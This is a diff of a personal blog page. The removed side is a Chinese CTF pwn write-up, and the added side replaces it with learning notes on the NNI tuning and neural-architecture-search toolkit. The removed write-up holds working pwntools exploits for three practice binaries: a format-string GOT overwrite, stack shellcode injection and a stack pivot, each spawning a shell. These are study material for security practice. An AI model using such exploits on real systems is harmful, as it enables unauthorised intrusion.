@@ -21,20 +21,20 @@
     var CONFIG = {"hostname":"121.36.2.124","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="axb_2019_fmt3232位格式化字符串漏洞，有几个特点需要注意：  测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。 用格式化字符串漏洞泄露libc的时候用%s，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。 fmtstr_payload填了四个参数，其中注意numbwritten参数，意思是格式化字符串中前面已有的">
+  <meta name="description" content="未完成任务Task 2.2-[] HPO-[] 在搜索空间中选择随机结构，并验证性能-[] NAS Task 3.1-[] 跑通NNI Feature Engineering Sample Task 3.2Task 3.2.1Task 3.2.2Task 4HPO超参调优在NNI中比较好实现，只要有参数和模型的搜索空间，就可以利用NNI自带的tuner来做调参工作。 Assessor在数据量较大的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Writeup for Second Week">
-<meta property="og:url" content="https://121.36.2.124/2021/01/22/Writeup-for-Second-Week/index.html">
+<meta property="og:title" content="NNI Exploration Learning Notes">
+<meta property="og:url" content="https://121.36.2.124/2021/01/23/NNI-Exploration-Learning-Notes/index.html">
 <meta property="og:site_name" content="Garen Wang&#39;s Blog">
-<meta property="og:description" content="axb_2019_fmt3232位格式化字符串漏洞，有几个特点需要注意：  测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。 用格式化字符串漏洞泄露libc的时候用%s，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。 fmtstr_payload填了四个参数，其中注意numbwritten参数，意思是格式化字符串中前面已有的">
+<meta property="og:description" content="未完成任务Task 2.2-[] HPO-[] 在搜索空间中选择随机结构，并验证性能-[] NAS Task 3.1-[] 跑通NNI Feature Engineering Sample Task 3.2Task 3.2.1Task 3.2.2Task 4HPO超参调优在NNI中比较好实现，只要有参数和模型的搜索空间，就可以利用NNI自带的tuner来做调参工作。 Assessor在数据量较大的">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-01-22T03:11:17.000Z">
-<meta property="article:modified_time" content="2021-01-23T15:05:32.633Z">
+<meta property="article:published_time" content="2021-01-23T15:19:35.000Z">
+<meta property="article:modified_time" content="2021-01-23T16:06:34.331Z">
 <meta property="article:author" content="Garen Wang">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="NNI">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://121.36.2.124/2021/01/22/Writeup-for-Second-Week/">
+<link rel="canonical" href="https://121.36.2.124/2021/01/23/NNI-Exploration-Learning-Notes/">
 
 
 <script id="page-configurations">
@@ -47,7 +47,7 @@
   };
 </script>
 
-  <title>Writeup for Second Week | Garen Wang's Blog</title>
+  <title>NNI Exploration Learning Notes | Garen Wang's Blog</title>
   
 
 
@@ -185,7 +185,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/22/Writeup-for-Second-Week/">
+    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/23/NNI-Exploration-Learning-Notes/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -198,7 +198,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Writeup for Second Week
+          NNI Exploration Learning Notes
         </h1>
 
         <div class="post-meta">
@@ -208,18 +208,18 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2021-01-22 11:11:17" itemprop="dateCreated datePublished" datetime="2021-01-22T11:11:17+08:00">2021-01-22</time>
+              <time title="Created: 2021-01-23 23:19:35" itemprop="dateCreated datePublished" datetime="2021-01-23T23:19:35+08:00">2021-01-23</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-01-23 23:05:32" itemprop="dateModified" datetime="2021-01-23T23:05:32+08:00">2021-01-23</time>
+                <time title="Modified: 2021-01-24 00:06:34" itemprop="dateModified" datetime="2021-01-24T00:06:34+08:00">2021-01-24</time>
               </span>
 
           
-            <span id="/2021/01/22/Writeup-for-Second-Week/" class="post-meta-item leancloud_visitors" data-flag-title="Writeup for Second Week" title="Views">
+            <span id="/2021/01/23/NNI-Exploration-Learning-Notes/" class="post-meta-item leancloud_visitors" data-flag-title="NNI Exploration Learning Notes" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -234,8 +234,8 @@
       </span>
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2021/01/22/Writeup-for-Second-Week/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/22/Writeup-for-Second-Week/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/01/23/NNI-Exploration-Learning-Notes/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/23/NNI-Exploration-Learning-Notes/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -250,23 +250,17 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h2><p>32位格式化字符串漏洞，有几个特点需要注意：</p>
-<ol>
-<li>测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。</li>
-<li>用格式化字符串漏洞泄露libc的时候用<code>%s</code>，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。</li>
-<li><code>fmtstr_payload</code>填了四个参数，其中注意<code>numbwritten</code>参数，意思是格式化字符串中前面已有的字符数。0xa就是<code>Repeater:A</code>的位数。</li>
-<li>最后劫持了<code>printf</code>的got表，填个分号做命令分割，就直接拿shell了。</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="string">&#x27;26090&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;XAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + p32(puts_got) + <span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Repeater:A&quot;</span>)</span><br><span class="line">puts_addr = p.recv(<span class="number">8</span>)[-<span class="number">4</span>:]</span><br><span class="line">puts_addr = u32(puts_addr)</span><br><span class="line">log.info(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment"># log.info(hex(system_addr))</span></span><br><span class="line"><span class="comment"># log.info(hex(binsh_addr))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + fmtstr_payload(<span class="number">8</span>, &#123;printf_got: system_addr&#125;, write_size=<span class="string">&#x27;byte&#x27;</span>, numbwritten=<span class="number">0xa</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>在当前栈空间外面写shellcode，gdb调出偏移，借助最开始泄露的地址写入shellcode在栈上的地址，就能跳转到栈上的shellcode。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, &#x27;28529&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">buf = p.recvline().strip()</span><br><span class="line">base_addr = <span class="built_in">int</span>(buf, <span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(len(shellcode))</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x16</span> - <span class="number">0x8</span> + <span class="number">0x4</span>) + p32(base_addr - <span class="number">0x1c</span>) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>0x28的栈溢出只能输入0x30，这时候要用到栈劫持，新的知识点。</p>
-<p>大体思路就是先通过一个<code>leave</code>然后<code>ret</code>的gadget强行把栈缩小，然后我们就在当前部分的栈帧里去布置就可以了。</p>
-<p>直接粘核心exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">str_addr = ebp_addr - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(str_addr + <span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(str_addr) + p32(leave_ret)</span><br></pre></td></tr></table></figure>
-<p>这个payload的构造挺巧妙的，稍微分析下：</p>
-<p>最后的0x8个字节用字符串起始地址覆盖了ebp，后面紧接着<code>leave</code>和<code>ret</code>，<code>leave</code>的时候直接调到字符串其实地址，<code>ret</code>的时候从<code>aaaa</code>跳到后面的system函数地址。system参数，同样是用在栈上写字符串的方法解决的。</p>
-
+        <h2 id="未完成任务"><a href="#未完成任务" class="headerlink" title="未完成任务"></a>未完成任务</h2><h3 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2.2"></a>Task 2.2</h3><p>-[] HPO<br>-[] 在搜索空间中选择随机结构，并验证性能<br>-[] NAS</p>
+<h3 id="Task-3-1"><a href="#Task-3-1" class="headerlink" title="Task 3.1"></a>Task 3.1</h3><p>-[] 跑通NNI Feature Engineering Sample</p>
+<h3 id="Task-3-2"><a href="#Task-3-2" class="headerlink" title="Task 3.2"></a>Task 3.2</h3><h4 id="Task-3-2-1"><a href="#Task-3-2-1" class="headerlink" title="Task 3.2.1"></a>Task 3.2.1</h4><h4 id="Task-3-2-2"><a href="#Task-3-2-2" class="headerlink" title="Task 3.2.2"></a>Task 3.2.2</h4><h3 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h3><h2 id="HPO"><a href="#HPO" class="headerlink" title="HPO"></a>HPO</h2><p>超参调优在NNI中比较好实现，只要有参数和模型的搜索空间，就可以利用NNI自带的tuner来做调参工作。</p>
+<h3 id="Assessor"><a href="#Assessor" class="headerlink" title="Assessor"></a>Assessor</h3><p>在数据量较大的情况下，一般一个trial普遍会比较久，NNI支持Assessor，实现在调优过程中类似“剪枝”的功能，提供了提前终止某些trial的策略以节省实验时间。</p>
+<p>需要添加assessor时只需在<code>config.yml</code>中添加，这里以Curvefitting为例：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">assessor:</span></span><br><span class="line">  <span class="attr">builtinAssessorName:</span> <span class="string">Curvefitting</span></span><br><span class="line">  <span class="attr">classArgs:</span></span><br><span class="line">    <span class="attr">epoch_num:</span> <span class="number">10</span></span><br><span class="line">    <span class="attr">threshold:</span> <span class="number">0.9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="NAS"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h2><h3 id="搜索空间的编写"><a href="#搜索空间的编写" class="headerlink" title="搜索空间的编写"></a>搜索空间的编写</h3><p>在做NAS的过程中，我们需要手动写出待搜索的模型的类，我们借助NNI中的mutables来实现模型搜索空间的构建。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeuralNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(NeuralNet, self).__init__()</span><br><span class="line">        self.conv1 = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;conv1&#x27;</span>)</span><br><span class="line">        self.mid_conv = mutables.LayerChoice([</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, padding=<span class="number">2</span>)</span><br><span class="line">        ], key=<span class="string">&#x27;mid_conv&#x27;</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">8</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">        self.pool = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        self.func1 = nn.Linear(<span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>, <span class="number">120</span>)</span><br><span class="line">        self.func2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.func3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>)</span><br><span class="line">        self.input_switch = mutables.InputChoice(n_candidates=<span class="number">1</span>, key=<span class="string">&#x27;skip&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = self.pool(F.relu(self.conv1(x)))</span><br><span class="line">        x = self.mid_conv(x)</span><br><span class="line">        skip_x = self.input_switch([x])</span><br><span class="line">        x = self.conv2(x)</span><br><span class="line">        <span class="keyword">if</span> skip_x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            x = x + skip_x</span><br><span class="line">        x = self.pool(F.relu(x))</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">16</span> * <span class="number">5</span> * <span class="number">5</span>)</span><br><span class="line">        x = F.relu(self.func1(x))</span><br><span class="line">        x = F.relu(self.func2(x))</span><br><span class="line">        x = self.func3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
+<p><code>mutables.LayerChoice</code>实现了神经网络模型中一层的多选一，待选的神经网络层只需要在里面列出来即可。例如上面的代码，就实现了3*3和5*5两种二维卷积层的选择空间。</p>
+<p><code>mutables.InputChoice</code>实现了可跳过连接。在上述代码中，表示了mid_conv层是可跳过层。可跳过层的前后代码保持不变，在可跳过层则需要从可能连接加入到后一层的输出中。</p>
+<h3 id="Classical-NAS"><a href="#Classical-NAS" class="headerlink" title="Classical NAS"></a>Classical NAS</h3><h3 id="One-shot-NAS"><a href="#One-shot-NAS" class="headerlink" title="One-shot NAS"></a>One-shot NAS</h3><h3 id="DARTS"><a href="#DARTS" class="headerlink" title="DARTS"></a>DARTS</h3><h3 id="ENAS"><a href="#ENAS" class="headerlink" title="ENAS"></a>ENAS</h3>
     </div>
 
     
@@ -276,7 +270,7 @@
       <footer class="post-footer">
           
           <div class="post-tags">
-              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/NNI/" rel="tag"><i class="fa fa-tag"></i> NNI</a>
           </div>
 
         
@@ -285,13 +279,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/01/17/CSAPP-Attack-Lab-Writeup/" rel="prev" title="CSAPP Attack Lab Writeup">
-      <i class="fa fa-chevron-left"></i> CSAPP Attack Lab Writeup
+    <a href="/2021/01/22/Writeup-for-Second-Week/" rel="prev" title="Writeup for Second Week">
+      <i class="fa fa-chevron-left"></i> Writeup for Second Week
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/01/23/NNI-Exploration-Learning-Notes/" rel="next" title="NNI Exploration Learning Notes">
-      NNI Exploration Learning Notes <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -351,7 +342,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#axb-2019-fmt32"><span class="nav-number">1.</span> <span class="nav-text">axb_2019_fmt32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-pz-hackover-2016"><span class="nav-number">2.</span> <span class="nav-text">ez_pz_hackover_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-es-2"><span class="nav-number">3.</span> <span class="nav-text">ciscn_2019_es_2</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AA%E5%AE%8C%E6%88%90%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.</span> <span class="nav-text">未完成任务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-2-2"><span class="nav-number">1.1.</span> <span class="nav-text">Task 2.2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-3-1"><span class="nav-number">1.2.</span> <span class="nav-text">Task 3.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-3-2"><span class="nav-number">1.3.</span> <span class="nav-text">Task 3.2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task-3-2-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">Task 3.2.1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task-3-2-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">Task 3.2.2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task-4"><span class="nav-number">1.4.</span> <span class="nav-text">Task 4</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HPO"><span class="nav-number">2.</span> <span class="nav-text">HPO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Assessor"><span class="nav-number">2.1.</span> <span class="nav-text">Assessor</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NAS"><span class="nav-number">3.</span> <span class="nav-text">NAS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E7%A9%BA%E9%97%B4%E7%9A%84%E7%BC%96%E5%86%99"><span class="nav-number">3.1.</span> <span class="nav-text">搜索空间的编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Classical-NAS"><span class="nav-number">3.2.</span> <span class="nav-text">Classical NAS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#One-shot-NAS"><span class="nav-number">3.3.</span> <span class="nav-text">One-shot NAS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DARTS"><span class="nav-number">3.4.</span> <span class="nav-text">DARTS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ENAS"><span class="nav-number">3.5.</span> <span class="nav-text">ENAS</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
